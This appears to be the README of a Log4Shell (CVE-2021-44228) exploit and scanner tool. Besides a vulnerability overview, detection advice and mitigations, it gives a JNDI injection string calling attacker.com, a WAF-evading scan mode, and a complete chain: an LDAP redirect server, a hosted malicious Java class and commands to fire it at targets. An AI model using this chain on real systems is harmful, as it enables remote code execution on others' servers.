Log4Shell (CVE-2021-44228)
==========================

**Original Discovery:** Chen Zhaojun of Alibaba Cloud Security Team  
**Adapted by:**         Hyperion Gray Security Research Team  
**Date:**               2021-12-09 (discovery) / 2024-11-16 (adaptation)  
**CVE:**                [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)  
**CVSS Score:**         10.0 (Critical)  
**Advisory:**           https://www.lunasec.io/docs/blog/log4j-zero-day/  
**Tested on:**          Applications using Log4j 2.14.1 and earlier

Overview
--------

CVE-2021-44228, dubbed "Log4Shell", is one of the most critical vulnerabilities discovered
in recent years. It affects Apache Log4j 2, a widely-used Java logging library found in
countless enterprise applications, web servers, and cloud services.

The vulnerability allows unauthenticated remote code execution through JNDI (Java Naming
and Directory Interface) injection. An attacker can trigger the vulnerability by including
a specially crafted string in any data that gets logged by the application. The vulnerable
Log4j library will parse JNDI references and attempt to load resources from attacker-
controlled servers, leading to arbitrary code execution.

Affected Versions
----------------

- Apache Log4j 2.0-beta9 through 2.14.1 (full RCE)
- Apache Log4j 2.15.0 (partial fix, still vulnerable to DoS - CVE-2021-45046)
- Apache Log4j 2.16.0 (Java 8) and 2.12.2 (Java 7) - Patched versions

**Note:** Versions before 2.0 (Log4j 1.x) are not vulnerable to this specific issue,
but have other known vulnerabilities and are end-of-life.

Technical Details
----------------

The vulnerability exists in Log4j's message lookup feature, which processes special
syntax in log messages. When Log4j encounters a string like `${jndi:ldap://...}`, it:

1. Recognizes this as a JNDI lookup request
2. Connects to the specified LDAP/RMI/DNS server
3. Retrieves a Java object reference from that server
4. Loads and instantiates the Java class, executing arbitrary code

Attack Flow:
1. Attacker injects `${jndi:ldap://attacker.com/Exploit}` into a logged field
2. Application logs this string using vulnerable Log4j
3. Log4j performs JNDI lookup to attacker.com
4. Attacker's LDAP server responds with malicious Java class reference
5. Application loads and executes the malicious class

Common injection points:
- HTTP headers (User-Agent, X-Forwarded-For, Referer, etc.)
- Form fields (username, search queries, comments)
- URL parameters
- API parameters
- Any data that might be logged

Installation
-----------

Install required dependencies:

```bash
pip install requests
```

For full exploitation, you'll also need:
- Java JDK 8 (for creating malicious Java payloads)
- LDAP server (marshalsec or similar)
- HTTP server (to host malicious Java classes)

Usage
-----

### Scanning Mode

Test if a target is vulnerable by scanning common injection points:

```bash
# Basic scan
python exploit.py -t http://target.com:8080 -c your-server.com

# Scan with obfuscated payload (bypasses some WAFs)
python exploit.py -t http://target.com:8080 -c your-server.com -o

# Scan with custom callback port
python exploit.py -t http://target.com:8080 -c your-server.com -p 1389
```

### Callback Listener Mode

Start a simple callback listener to detect if exploitation was successful:

```bash
# Listen for DNS callbacks (requires sudo for port 53)
sudo python exploit.py -l

# Listen on custom port
python exploit.py -l --listen-port 8888
```

### Full Exploitation Example

For complete exploitation with code execution:

1. Set up LDAP redirect server (using marshalsec):
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \
  "http://attacker.com:8000/#Exploit"
```

2. Create malicious Java payload (Exploit.java):
```java
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

3. Compile and host the payload:
```bash
javac Exploit.java
python3 -m http.server 8000
```

4. Run the scanner:
```bash
python exploit.py -t http://target.com:8080 -c attacker.com
```

5. Check your LDAP server and HTTP server logs for connections

Detection
---------

Vulnerable applications can be detected by:
- Monitoring outbound LDAP/RMI/DNS connections from application servers
- Checking for strings containing `${jndi:` in logs
- Using vulnerability scanners like Nessus, Qualys, or custom scripts
- Analyzing network traffic for suspicious JNDI lookups

Mitigation
----------

### Immediate Actions (in order of preference)

1. **Upgrade Log4j**: 
   - Version 2.17.1 or later (Java 8)
   - Version 2.12.4 or later (Java 7)
   - Version 2.3.2 or later (Java 6)

2. **Disable JNDI Lookups** (if upgrade not immediately possible):
   - Set system property: `-Dlog4j2.formatMsgNoLookups=true`
   - Set environment variable: `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`

3. **Remove JndiLookup class** (temporary workaround):
   ```bash
   zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
   ```

4. **Update JDK** to latest version (limits exploitation via trustURLCodebase)

5. **Network Controls**:
   - Block outbound LDAP (389, 636)
   - Block outbound RMI (1098, 1099, 1050)
   - Monitor and restrict outbound connections from application servers

### Long-term Recommendations

- Implement dependency scanning in CI/CD pipeline
- Use Software Composition Analysis (SCA) tools
- Keep all dependencies up to date
- Implement defense-in-depth security measures
- Use Web Application Firewalls (WAF) with Log4Shell rules

Real-World Impact
----------------

Log4Shell has been one of the most severe vulnerabilities in modern computing history:
- Affects millions of applications worldwide
- Found in VMware, Cisco, Apache, Tesla, Apple iCloud, Minecraft, and countless others
- Actively exploited in the wild within hours of disclosure
- Used for cryptomining, ransomware, and botnet deployment
- CISA added to Known Exploited Vulnerabilities catalog

References
----------

- [LunaSec Advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/)
- [Apache Log4j Security](https://logging.apache.org/log4j/2.x/security.html)
- [CISA Advisory](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Swiss Government NCSC Analysis](https://www.ncsc.admin.ch/ncsc/en/home/cyberangriffe/aktuelle-cyberangriffe/zero-day-schwachstelle-log4j-bibliothek.html)
- [Cloudflare Analysis](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)

Legal Notice
-----------

This tool is provided for educational and authorized security testing purposes only.
Unauthorized access to computer systems is illegal. Always obtain explicit written
permission before testing any system you do not own. The authors and contributors
are not responsible for misuse of this tool.
